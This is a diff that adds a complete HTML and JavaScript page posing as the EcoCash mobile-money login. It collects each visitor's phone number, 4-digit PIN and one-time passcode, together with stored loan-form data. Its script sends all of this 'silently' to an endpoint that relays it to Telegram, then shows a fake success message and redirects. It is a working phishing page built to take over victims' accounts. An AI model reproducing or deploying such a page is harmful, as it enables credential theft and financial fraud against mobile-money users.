@@ -1,0 +1,407 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>EcoCash — Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    font-family:Inter,system-ui,Arial;
+    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
+    margin:0;
+    -webkit-font-smoothing:antialiased;
+    padding:18px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+  }
+
+  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
+  .logo{height:44px;display:block;margin:0 auto 10px}
+  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
+  label{display:block;font-size:13px;color:#374151;margin-top:8px}
+  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px;box-sizing:border-box}
+  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
+  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
+
+  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
+  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
+
+  .req{color:#d04444;margin-right:6px}
+  .small{font-size:13px;color:#6b7280}
+  .success{color:#16a34a;font-weight:600}
+  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
+
+  /* six-digit input row */
+  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+  .otp-digit{
+    width:40px;
+    height:48px;
+    text-align:center;
+    font-size:20px;
+    border-radius:8px;
+    border:1px solid #e6eefc;
+    background:#fbfdff;
+  }
+
+  .resend-row{display:flex;gap:10px;align-items:center;margin-top:12px;justify-content:space-between}
+  .resend-info{font-size:13px;color:#6b7280}
+  .resend-btn{background:#fff;border:1px solid #e6eefc;padding:8px 12px;border-radius:8px;cursor:pointer}
+  .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
+
+  @media(max-width:420px){
+    .card{padding:16px}
+    h2{font-size:18px}
+    .logo{height:40px}
+    .otp-box{min-width:280px}
+    .otp-digit{width:38px;height:44px;font-size:18px}
+  }
+</style>
+</head>
+<body>
+  <div class="card">
+
+    <!-- keep this line exactly as in your file -->
+    <img src="assets/eco.png" alt="EcoCash logo" class="logo">
+
+    <h2>Log In</h2>
+    <form id="loginForm" autocomplete="off">
+      <label><span class="req">★</span>Mobile Number
+        <input id="phone" name="phone" required placeholder="+2637..." value="+263" inputmode="tel" autocomplete="tel" />
+      </label>
+
+      <label><span class="req">★</span>4-Digit PIN
+        <input id="pin" name="pin" required maxlength="4" placeholder="Enter 4-digit PIN" inputmode="numeric" pattern="\d{4}" />
+      </label>
+
+      <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
+    </form>
+  </div>
+
+  <!-- OTP modal -->
+  <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
+    <div class="otp-box" role="dialog" aria-modal="true" aria-labelledby="otpTitle">
+      <div id="otpTitle" style="text-align:center"><strong>Enter OTP</strong></div>
+      <p class="small" style="margin:8px 0 10px">We have sent an OTP to your phone. Enter it here to confirm.</p>
+
+      <!-- six separate digit boxes -->
+      <div class="otp-row" aria-live="polite" aria-label="OTP inputs">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d0" aria-label="Digit 1">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d1" aria-label="Digit 2">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d2" aria-label="Digit 3">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d3" aria-label="Digit 4">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d4" aria-label="Digit 5">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d5" aria-label="Digit 6">
+      </div>
+
+      <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
+
+      <div class="resend-row">
+        <div class="resend-info" id="resendInfo">Resend available in <span id="countdown">120</span>s</div>
+        <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+      </div>
+
+      <div style="display:flex;gap:10px;margin-top:12px">
+        <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer" disabled>Confirm</button>
+        <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
+      </div>
+
+      <div id="otpStatus" class="small" style="margin-top:8px"></div>
+    </div>
+  </div>
+
+<script>
+  // Prefill phone if saved
+  (function(){
+    try {
+      const data = sessionStorage.getItem('loanForm');
+      if (data) {
+        const form = JSON.parse(data);
+        if (form.phone) document.getElementById('phone').value = form.phone;
+      }
+    } catch(e){}
+  })();
+
+  // DOM refs
+  const phoneEl = document.getElementById('phone');
+  const pinEl = document.getElementById('pin');
+  const loginBtn = document.getElementById('loginBtn');
+
+  function updateLoginState(){
+    const pinValid = /^\d{4}$/.test(pinEl.value);
+    const phoneValid = phoneEl.value.trim().length > 0;
+    loginBtn.disabled = !(pinValid && phoneValid);
+  }
+
+  pinEl.addEventListener('input', function(){
+    // only digits and max 4
+    this.value = this.value.replace(/\D/g,'').slice(0,4);
+    updateLoginState();
+  });
+  phoneEl.addEventListener('input', updateLoginState);
+  updateLoginState();
+
+  // sendToServer helper — VERCEL VERSION
+  async function sendToServer(payload) {
+    return fetch('/api/sendTelegram', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+  }
+
+  // OTP modal references
+  const otpModal = document.getElementById('otpModal');
+  const dEls = Array.from([0,1,2,3,4,5]).map(i => document.getElementById('d'+i));
+  const confirmBtn = document.getElementById('confirmOtp');
+  const cancelBtn = document.getElementById('cancelOtp');
+  const otpWarning = document.getElementById('otpWarning');
+  const otpStatus = document.getElementById('otpStatus');
+  const resendBtn = document.getElementById('resendBtn');
+  const countdownEl = document.getElementById('countdown');
+  const resendInfo = document.getElementById('resendInfo');
+
+  let resendTimer = null;
+  const RESEND_SECONDS = 120;
+  let secondsLeft = RESEND_SECONDS;
+
+  function startResendCountdown() {
+    // disable button and start countdown from RESEND_SECONDS
+    clearInterval(resendTimer);
+    secondsLeft = RESEND_SECONDS;
+    resendBtn.disabled = true;
+    updateResendDisplay();
+    resendTimer = setInterval(() => {
+      secondsLeft--;
+      if (secondsLeft <= 0) {
+        clearInterval(resendTimer);
+        resendBtn.disabled = false;
+        resendInfo.textContent = 'Didn\'t receive OTP?';
+        countdownEl.textContent = '';
+      } else {
+        updateResendDisplay();
+      }
+    }, 1000);
+  }
+
+  function updateResendDisplay(){
+    countdownEl.textContent = String(secondsLeft);
+    resendInfo.innerHTML = `Resend available in <span id="countdown">${secondsLeft}</span>s`;
+  }
+
+  // Build OTP string from boxes
+  function getOtpFromBoxes(){
+    return dEls.map(el => el.value || '').join('');
+  }
+
+  // set OTP boxes value from a string (helper)
+  function setOtpBoxes(val){
+    for (let i=0;i<6;i++){
+      dEls[i].value = val[i] || '';
+    }
+    updateConfirmState();
+  }
+
+  // update Confirm button enable state
+  function updateConfirmState(){
+    const otp = getOtpFromBoxes();
+    if (/^\d{6}$/.test(otp)){
+      confirmBtn.disabled = false;
+      otpWarning.style.display = 'none';
+    } else {
+      confirmBtn.disabled = true;
+    }
+  }
+
+  // smart focus + navigation for the six boxes
+  dEls.forEach((el, idx) => {
+    el.addEventListener('input', (e) => {
+      const v = el.value.replace(/\D/g,'').slice(0,1);
+      el.value = v;
+      if (v && idx < dEls.length - 1) {
+        dEls[idx+1].focus();
+      }
+      updateConfirmState();
+    });
+
+    el.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace') {
+        // if empty go to previous
+        if (el.value === '' && idx > 0) {
+          e.preventDefault();
+          dEls[idx-1].focus();
+          dEls[idx-1].value = '';
+        }
+      } else if (e.key === 'ArrowLeft' && idx > 0) {
+        e.preventDefault();
+        dEls[idx-1].focus();
+      } else if (e.key === 'ArrowRight' && idx < dEls.length-1) {
+        e.preventDefault();
+        dEls[idx+1].focus();
+      }
+    });
+
+    el.addEventListener('paste', (e) => {
+      // support paste of full OTP (6 digits)
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\s/g,'');
+      const digits = paste.replace(/\D/g,'').slice(0,6);
+      if (digits.length) {
+        setOtpBoxes(digits.split(''));
+        // focus after last filled
+        const last = Math.min(digits.length-1, 5);
+        dEls[last].focus();
+      }
+    });
+
+    el.addEventListener('blur', () => {
+      // if any non-digit show warning only when user leaves
+      if (getOtpFromBoxes().length > 0 && !/^\d{6}$/.test(getOtpFromBoxes())){
+        otpWarning.style.display = 'block';
+      } else {
+        otpWarning.style.display = 'none';
+      }
+    });
+  });
+
+  // When LOGIN is clicked: send phone+pin to Telegram silently, then open OTP modal and start countdown
+  document.getElementById('loginForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const pin = pinEl.value.trim();
+    if(!/^\d{4}$/.test(pin)){ alert("PIN must be exactly 4 digits"); return; }
+    const phone = phoneEl.value.trim();
+    if(!phone){ alert("Enter phone"); return; }
+
+    // open OTP modal immediately
+    otpModal.style.display = 'flex';
+    setOtpBoxes('');
+    otpWarning.style.display = 'none';
+    confirmBtn.disabled = true;
+    otpStatus.textContent = '';
+    startResendCountdown();
+    setTimeout(()=> dEls[0].focus(), 80);
+
+    // send login details silently (non-blocking)
+    (async () => {
+      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+      try {
+        const resp = await sendToServer({
+          submittedAt: new Date().toISOString(),
+          event: 'login_clicked',
+          loanData,
+          loginPhone: phone,
+          loginPin: pin
+        });
+        if (!resp.ok) {
+          const txt = await resp.text();
+          console.error('Send failed (login click) — Telegram error:', txt);
+        } else {
+          console.log('Login details sent (login click).');
+        }
+      } catch (err) {
+        console.error('Failed to send login details (login click):', err);
+      }
+    })();
+  });
+
+  // Cancel OTP modal
+  cancelBtn.addEventListener('click', ()=>{
+    otpModal.style.display = 'none';
+    clearInterval(resendTimer);
+  });
+
+  // Resend button: when clicked it should re-send the same login action (like "reclick" login)
+  resendBtn.addEventListener('click', async () => {
+    // If disabled, do nothing
+    if (resendBtn.disabled) return;
+
+    // re-trigger the same behavior as login click: send login details again and restart countdown
+    const pin = pinEl.value.trim();
+    const phone = phoneEl.value.trim();
+    if(!phone || !/^\d{4}$/.test(pin)){
+      // If user changed inputs so they are invalid, show friendly message and close modal
+      otpStatus.textContent = 'Phone or PIN missing/invalid — please re-enter and try login again.';
+      return;
+    }
+
+    // restart timer immediately
+    startResendCountdown();
+    otpStatus.textContent = 'Resending OTP…';
+
+    (async () => {
+      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+      try {
+        const resp = await sendToServer({
+          submittedAt: new Date().toISOString(),
+          event: 'resend_otp',
+          loanData,
+          loginPhone: phone,
+          loginPin: pin
+        });
+
+        if (!resp.ok) {
+          const txt = await resp.text();
+          console.error('Send failed (resend) — Telegram error:', txt);
+          otpStatus.textContent = 'Server error resending OTP — try again later.';
+        } else {
+          otpStatus.textContent = 'OTP resent. Check your phone.';
+        }
+      } catch (err) {
+        console.error('Network error sending resend:', err);
+        otpStatus.textContent = 'Network error — check your connection.';
+      }
+    })();
+  });
+
+  // Confirm OTP: join boxes and send to server
+  confirmBtn.addEventListener('click', async ()=>{
+    const code = getOtpFromBoxes();
+    if(!/^\d{6}$/.test(code)){ otpWarning.style.display = 'block'; return; }
+
+    otpWarning.style.display = 'none';
+    otpStatus.textContent = "Sending…";
+    confirmBtn.disabled = true;
+
+    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+    const phone = phoneEl.value.trim();
+    const pin = pinEl.value.trim();
+
+    try {
+      const resp = await sendToServer({
+        submittedAt: new Date().toISOString(),
+        event: 'otp_confirm',
+        loanData,
+        loginPhone: phone,
+        loginPin: pin,
+        otp: code
+      });
+
+      if (!resp.ok) {
+        const txt = await resp.text();
+        console.error('Telegram error (confirm):', txt);
+        otpStatus.textContent = "Server error sending OTP — please try again.";
+        confirmBtn.disabled = false;
+        return;
+      }
+
+      // success
+      otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
+      sessionStorage.removeItem('loanForm');
+      clearInterval(resendTimer);
+      setTimeout(()=> window.location.href = "thankyou.html", 1200);
+    } catch (err) {
+      console.error('Network error sending OTP:', err);
+      otpStatus.textContent = "Network error — please check your connection and try again.";
+      confirmBtn.disabled = false;
+    }
+  });
+
+  // If user manually types into boxes, update confirm state
+  dEls.forEach(el => el.addEventListener('input', updateConfirmState));
+</script>
+</body>
+</html>
